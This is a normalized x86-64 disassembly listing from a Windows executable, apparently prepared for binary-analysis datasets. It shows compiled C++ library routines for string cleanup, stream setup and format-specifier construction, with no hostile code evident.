je r-xdata
mov rbx r15
mov [ rax + 0x18 ] 0x7
mov [ rax + 0x10 ] r15
mov [ rax ] r15w
jmp r-xdata
test rbx rbx
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
mov r8 rbx
mov rdx rbp
mov rcx rsi
call sub_140028710
test al al
je r-xdata
mov r8 r14
mov rdx rbp
mov rcx rsi
call sub_140028910
movzx ebx al
test al al
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
test rbp rbp
je r-xdata
lea rdx [ r--data ]
lea r15 [ rw-data ]
mov rcx r15
call sub_14000ac10
mov r13d 0x10
lea r12d [ r13 + 0x20 ]
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r15
mov [ rbx ] r15w
mov rcx rbx
call j_sub_14003ad04
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbp + 0x18 ] 0x10
jb r-xdata
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
add rcx r15
and [ rcx + 0x18 ] 0xfffff9ff
or [ rcx + 0x18 ] 0x800
mov edx 0x2
lea rcx [ rsp + 0x30 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx r15
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + r15 + 0x58 ] r12w
movzx edx [ r14 ]
mov rcx r15
call sub_140010430
inc r14
dec r13
jne r-xdata
mov rax [ rw-data ]
movsxd rdx [ rax + 0x4 ]
add rdx r15
and [ rdx + 0x18 ] 0xfffff3ff
or [ rdx + 0x18 ] 0x200
mov rcx r15
call sub_140007970
mov r12 [ rsp + 0x28 ]
xor r15d r15d
mov [ rbp + 0x18 ] 0xf
mov [ rbp + 0x10 ] r15
mov [ rbp ] 0x0
mov rcx rbp
call j_sub_14003ad04
mov rcx [ rbp ]
call j_sub_14003ad04
sub_140028710
mov rax rsp
mov [ rax + 0x18 ] r8
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov rdi rdx
mov r15 rcx
mov ecx 0x28
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x98 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] 0x0
mov [ rax ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rax
call sub_140005f40
jmp r-xdata
xor edi edi
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] 0x0
mov [ rax ] 0x0
mov r8d 0xc
lea rdx [ r--data ]
mov rcx rax
call sub_140005c90
jmp r-xdata
mov r8d 0x22
lea rdx [ r--data ]
mov rcx rbx
call sub_14000a5c0
mov ecx 0x28
call sub_14003ac60
mov rdi rax
mov [ rsp + 0x98 ] rax
test rax rax
je r-xdata
xor ebp ebp
xor edx edx
lea r8d [ r14 + 0x58 ]
mov rcx rax
call sub_14003d760
jmp r-xdata
xor r14d r14d
mov [ rsp + 0x98 ] r14d
xor r13d r13d
mov [ rsp + 0x38 ] r13
xor r12b r12b
lea ecx [ r14 + 0x58 ]
call sub_14003ac60
mov rbp rax
test rax rax
je r-xdata
mov rcx rbp
call j_sub_14003ad04
test r12b r12b
je r-xdata
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x38 ]
mov r8 rbp
mov rdx rdi
mov rcx r15
call sub_1400058d0
movzx r12d al
mov r14d [ rsp + 0x98 ]
mov r13 [ rsp + 0x38 ]
mov [ rsp + 0x30 ] rbp
lea r8 [ rsp + 0x30 ]
mov rdx rbx
mov rcx r15
call sub_140005730
test al al
je r-xdata
test rdi rdi
je r-xdata
movsxd r8 r14d
shr r8 0x1
mov rdx r13
mov rcx [ rsp + 0x90 ]
call sub_140001ea0
mov rcx r13
call j_sub_14003ad04#2
test rbx rbx
je r-xdata
cmp [ rdi + 0x18 ] 0x10
jb r-xdata
movzx eax r12b
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rdi + 0x18 ] 0xf
mov [ rdi + 0x10 ] 0x0
mov [ rdi ] 0x0
mov rcx rdi
call j_sub_14003ad04
mov rcx [ rdi ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
mov rcx rbx
call j_sub_14003ad04
mov rcx [ rbx ]
call j_sub_14003ad04
sub_140028910
mov r11 rsp
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xd0
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ r11 + 0x20 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov [ rsp + 0x30 ] r8
mov rdi rdx
mov [ rsp + 0x28 ] rdx
lea rax [ r--data ]
mov [ rsp + 0x38 ] rax
lea rax [ r--data ]
mov [ rsp + 0x40 ] rax
lea rax [ r--data ]
mov [ rsp + 0x48 ] rax
lea rax [ r--data ]
mov [ rsp + 0x50 ] rax
movdqa xmm0 [ r--data ]
movdqa [ rsp + 0x60 ] xmm0
movdqa xmm1 [ r--data ]
movdqa [ rsp + 0x70 ] xmm1
movdqa xmm0 [ r--data ]
movdqa [ rsp + 0x80 ] xmm0
movdqa xmm1 [ r--data ]
movdqa [ r11 - 0x78 ] xmm1
lea r14 [ rsp + 0x38 ]
lea r12 [ r11 - 0x58 ]
mov r15d 0x4
mov r13 rcx
nop
mov rbx rbp
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] rbp
mov [ rax ] bpl
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rax
call sub_140005f40
jmp r-xdata
mov rsi rbp
mov [ rsp + 0x20 ] rbp
xor edx edx
lea r8d [ rdx + 0x58 ]
mov rcx rax
call sub_14003d760
mov [ rsp + 0x20 ] rsi
jmp r-xdata
mov r8d 0xd
lea rdx [ r--data ]
mov rcx rbx
call sub_14000a5c0
mov rdx [ r14 ]
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_14000a5c0
mov ecx 0x58
call sub_14003ac60
mov rsi rax
test rax rax
je r-xdata
mov rcx rsi
call j_sub_14003ad04
test rbx rbx
je r-xdata
mov [ rsp + 0xa0 ] 0x0
xor eax eax
mov [ rsp + 0xa1 ] rax
mov ecx [ rsi + 0x30 ]
add ecx 0x1000
movsxd rdx ecx
mov rcx [ r13 ]
lea r8 [ rdx + rcx + 0x4 ]
movzx edi ax
movsx eax [ rsi + 0x4a ]
cdq
sub eax edx
sar eax 0x1
test eax eax
jle r-xdata
lea r8 [ rsp + 0x20 ]
mov rdx rbx
mov rcx r13
call sub_140005730
movzx ebp al
test al al
je r-xdata
add r12 0x4
add r14 0x8
dec r15
mov rdi [ rsp + 0x28 ]
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov r8 r12
lea rdx [ r--data ]
lea rcx [ rsp + 0xa0 ]
call sub_14003d254
nop [ rax ] eax
xor ebp ebp
lea ecx [ rbp + 0x28 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
test bpl bpl
mov r13d 0x4
je r-xdata
mov [ rbx + 0x18 ] 0xf
xor eax eax
mov [ rbx + 0x10 ] rax
mov [ rbx ] al
mov rcx rbx
call j_sub_14003ad04
mov rcx [ rbx ]
call j_sub_14003ad04
movsx rcx di
movzx eax [ r8 + rcx * 2 ]
mov [ rsp + rcx + 0xa0 ] al
inc di
movsx eax [ rsi + 0x4a ]
cdq
sub eax edx
sar eax 0x1
movsx edx di
cmp edx eax
jl r-xdata
movzx eax bpl
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x128 ]
add rsp 0xd0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rdx [ rsp + 0x30 ]
inc rdx
lea rdi [ rsp + 0x64 ]
nop [ rax + rax ] ax
cmp di 0x8
jge r-xdata
movsxd rax [ rdi - 0x4 ]
movzx ecx [ rsp + rax + 0xb0 ]
mov [ rdx - 0x1 ] cl
movsxd rax [ rdi ]
movzx ecx [ rsp + rax + 0xb0 ]
mov [ rdx ] cl
movsxd rax [ rdi + 0x4 ]
movzx ecx [ rsp + rax + 0xb0 ]
mov [ rdx + 0x1 ] cl
movsxd rax [ rdi + 0x8 ]
movzx ecx [ rsp + rax + 0xb0 ]
mov [ rdx + 0x2 ] cl
add rdx 0x4
add rdi 0x10
dec r13
jne r-xdata
sub_140028bf0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x8 ] rcx
push rbx
push rbp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov rdi rdx
xor r12b r12b
mov ecx 0x28
call sub_14003ac60
mov rbx rax
mov [ rsp + 0xa8 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] 0x0
mov [ rax ] r12b
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rax
call sub_140005f40
jmp r-xdata
xor edi edi
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] 0x0
mov [ rax ] 0x0
mov r8d 0x7
lea rdx [ r--data ]
mov rcx rax
call sub_140005c90
jmp r-xdata
mov r8d 0x7
lea rdx [ r--data ]
mov rcx rbx
call sub_14000a5c0
mov ecx 0x28
call sub_14003ac60
mov rdi rax
mov [ rsp + 0xa8 ] rax
test rax rax
je r-xdata
xor ebp ebp
xor edx edx
lea r8d [ r14 + 0x58 ]
mov rcx rax
call sub_14003d760
jmp r-xdata
xor r14d r14d
mov [ rsp + 0xa8 ] r14d
xor r13d r13d
mov [ rsp + 0x38 ] r13
xor r15b r15b
lea ecx [ r14 + 0x58 ]
call sub_14003ac60
mov rbp rax
test rax rax
je r-xdata
mov rcx rbp
call j_sub_14003ad04
test r15b r15b
je r-xdata
lea rax [ rsp + 0xa8 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x38 ]
mov r8 rbp
mov rdx rdi
mov rcx [ rsp + 0x90 ]
call sub_1400058d0
movzx r15d al
mov r14d [ rsp + 0xa8 ]
mov r13 [ rsp + 0x38 ]
mov [ rsp + 0x30 ] rbp
lea r8 [ rsp + 0x30 ]
mov rdx rbx
mov rcx [ rsp + 0x90 ]
call sub_140005730
test al al
je r-xdata
test rdi rdi
je r-xdata
cmp r14d 0x4
sete r12b
test r12b r12b
je r-xdata
test rbx rbx
je r-xdata
cmp [ rdi + 0x18 ] 0x10
jb r-xdata
mov rcx r13
call j_sub_14003ad04#2
mov eax [ r13 ]
mov rcx [ rsp + 0xa0 ]
mov [ rcx ] eax
movzx eax r12b
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rbp
pop rbx
retn
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rdi + 0x18 ] 0xf
mov [ rdi + 0x10 ] 0x0
mov [ rdi ] 0x0
mov rcx rdi
call j_sub_14003ad04
mov rcx [ rdi ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
mov rcx rbx
call j_sub_14003ad04
mov rcx [ rbx ]
call j_sub_14003ad04
sub_140028df0
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14d edx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_140003240
nop
mov rcx rax
call sub_14002b5d0
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_1400103c0
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] al
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x30 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_140028ff0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
lea rax [ r--data ]
mov [ rcx + 0x98 ] rax
mov [ rsp + 0x48 ] 0x1
lea rdx [ rcx + 0x18 ]
call sub_14002a000
nop
mov rax [ rdi + 0x10 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi + 0x10 ] rax
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi ] rax
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi ] rax
lea rcx [ rdi + 0x18 ]
call sub_1400112f0
nop
lea rax [ r--data ]
mov [ rdi + 0x18 ] rax
mov [ rdi + 0x88 ] 0x0
mov [ rdi + 0x90 ] 0x0
mov rax rdi
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1400290c0
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx - 0x98 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x98 ] rax
lea rbx [ rcx - 0x80 ]
lea rax [ r--data ]
mov [ rbx ] rax
test [ rbx + 0x78 ] 0x1
je r-xdata
mov rax [ rbx + 0x20 ]
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rax [ rbx + 0x28 ]
mov [ rax ] rcx
mov rax [ rbx + 0x48 ]
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
mov [ rbx + 0x70 ] rcx
and [ rbx + 0x78 ] 0xfffffffe
mov rcx rbx
call sub_140010610
nop
mov rax [ rbx - 0x18 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x18 ] rax
mov rax [ rbx - 0x8 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x8 ] rax
mov rax [ rbx - 0x18 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x18 ] rax
add rsp 0x30
pop rbx
retn
mov rax [ rbx + 0x20 ]
mov rcx [ rax ]
call j_sub_14003ad04
sub_1400291c0
mov rax [ rcx - 0x18 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x18 ] rax
mov rax [ rcx - 0x8 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x8 ] rax
mov rax [ rcx - 0x18 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x18 ] rax
retn
sub_140029200
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x10 ]
lea rax [ r--data ]
mov ebx edx
mov r8 [ rdi ]
lea rcx [ rdi + 0x10 ]
movsxd r9 [ r8 + 0x4 ]
mov [ r9 + rcx - 0x10 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_140037d08
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140029260
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rsi [ rcx - 0x98 ]
mov edi edx
lea rcx [ rsi + 0x98 ]
call sub_1400290c0
lea rax [ r--data ]
lea rcx [ rsi + 0x98 ]
mov [ rsi + 0x98 ] rax
call sub_140037d08
test dil 0x1
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rsi
call j_sub_14003ad04
sub_1400292c0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x18 ]
mov ebx edx
mov rax [ rdi ]
lea rcx [ rdi + 0x18 ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx - 0x18 ] rax
mov rax [ rcx - 0x8 ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx - 0x8 ] rax
mov rdx [ rcx - 0x18 ]
lea rax [ r--data ]
movsxd r8 [ rdx + 0x4 ]
mov [ r8 + rcx - 0x18 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_140037d08
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140029340
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbx [ rcx ]
xor ebp ebp
mov rdi rcx
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rsi
mov rsi [ rcx + 0x8 ]
cmp rbx rsi
je r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov rsi [ rsp + 0x30 ]
nop [ rax + rax ] ax
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bpl
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
sub_1400293c0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xc8
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r15 r9
mov r14 r8
mov rbx rdx
mov [ rbp - 0x69 ] rdx
movzx r13d [ rbp + 0x77 ]
test [ r9 + 0x18 ] 0x4000
jne r-xdata
lea rdx [ rsp + 0x30 ]
mov rcx r9
call sub_140003240
nop
mov rcx rax
call sub_14002b720
mov rsi rax
xor r12d r12d
mov rdi [ rsp + 0x30 ]
test rdi rdi
je r-xdata
movups xmm0 [ r8 ]
movaps [ rbp - 0x69 ] xmm0
mov r10 [ rcx ]
movzx edx [ rbp + 0x7f ]
mov [ rsp + 0x28 ] edx
mov [ rsp + 0x20 ] r13b
lea r8 [ rbp - 0x69 ]
mov rdx rbx
call [ r10 + 0x38 ]
jmp r-xdata
mov [ rbp - 0x39 ] 0xf
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12b
lea rdx [ rbp - 0x29 ]
mov rcx rsi
cmp [ rbp + 0x7f ] 0x0
je r-xdata
xor edx edx
lea rcx [ rbp - 0x79 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
mov rax rbx
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
call sub_14000a430
mov rbx rax
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
call sub_14002aea0
mov rbx rax
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
mov rbx r12
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rbp - 0x79 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
cmp [ rbp - 0x11 ] 0x10
jb r-xdata
cmp [ rbp - 0x39 ] 0x10
jb r-xdata
jmp r-xdata
cmp [ rbp - 0x39 ] 0x10
jb r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov rdi [ r15 + 0x28 ]
mov rbx [ rbp - 0x41 ]
test rdi rdi
jle r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_14003ad04
mov [ rbp - 0x39 ] 0xf
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] 0x0
cmp [ rbx + 0x18 ] 0x10
jae r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_14003ad04
mov [ rbp - 0x39 ] 0xf
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] 0x0
cmp [ rbx + 0x18 ] 0x10
jae r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_14003ad04
mov rdi r12
cmp rdi rbx
jbe r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_14003a8c0
jmp r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_14003a8c0
jmp r-xdata
movups xmm0 [ r14 ]
movaps [ rsp + 0x30 ] xmm0
lea r12 [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x10
cmovae r12 [ rbp - 0x51 ]
test rbx rbx
je r-xdata
movups xmm0 [ r14 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
sub rdi rbx
jmp r-xdata
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] r12
mov [ rbx ] 0x0
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] r12
mov [ rbx ] 0x0
movups [ r14 ] xmm0
mov [ r15 + 0x28 ] 0x0
movups xmm0 [ r14 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
mov rsi [ rsp + 0x38 ]
movups [ r14 ] xmm0
mov rdi r12
mov rbx [ rsp + 0x38 ]
mov eax [ r15 + 0x18 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov rbx [ rbp - 0x69 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x39 ] 0x10
jb r-xdata
mov rbx [ rsp + 0x38 ]
nop [ rax ] eax
mov [ rsp + 0x30 ] 0x1
mov rax [ rsi + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_14003ad04
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movzx r8d [ r12 ]
test rsi rsi
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx r8b
mov rax [ rsi ]
mov rcx rsi
call [ rax + 0x18 ]
mov rax [ rsi + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
mov rbx [ rbp - 0x41 ]
movaps xmm0 [ rsp + 0x30 ]
movzx edx r13b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx r13b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
inc r12
dec rbx
jne r-xdata
dec [ rax ]
mov rcx [ rsi + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r13b
movzx eax r13b
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r13b
movzx eax r13b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_140029780
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
movups xmm0 [ r8 ]
mov eax [ r9 + 0x18 ]
mov rbx r9
mov rdi rdx
mov [ rsp + 0x40 ] 0x25
lea rcx [ rsp + 0x41 ]
movaps [ rsp + 0x30 ] xmm0
test al 0x20
je r-xdata
test al 0x8
je r-xdata
mov [ rsp + 0x41 ] 0x2b
lea rcx [ rsp + 0x42 ]
mov edx eax
mov [ rcx ] 0x6c
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rcx ] 0x23
inc rcx
cmp edx 0x800
je r-xdata
mov al 0x6f
jmp r-xdata
shl al 0x3
not al
and al 0x20
or al 0x58
mov al 0x64
jmp r-xdata
mov r9d [ rsp + 0xd8 ]
mov [ rcx + 0x1 ] al
mov [ rcx + 0x2 ] 0x0
lea rcx [ rsp + 0x50 ]
lea r8 [ rsp + 0x40 ]
mov edx 0x40
call sub_14003b81c
movzx r9d [ rsp + 0xd0 ]
lea rdx [ rsp + 0x30 ]
movsxd rcx eax
lea rax [ rsp + 0x50 ]
mov r8 rbx
mov [ rsp + 0x28 ] rcx
mov rcx rdi
mov [ rsp + 0x20 ] rax
call sub_14002aa80
mov rax rdi
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb0 ]
add rsp 0xa0
pop rdi
retn
sub_140029880
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
movups xmm0 [ r8 ]
mov eax [ r9 + 0x18 ]
mov rbx r9
mov rdi rdx
mov [ rsp + 0x40 ] 0x25
lea rcx [ rsp + 0x41 ]
movaps [ rsp + 0x30 ] xmm0
test al 0x20
je r-xdata
test al 0x8
je r-xdata
mov [ rsp + 0x41 ] 0x2b
lea rcx [ rsp + 0x42 ]
mov edx eax
mov [ rcx ] 0x6c
and edx 0xe00
cmp edx 0x400
jne r-xdata
mov [ rcx ] 0x23
inc rcx
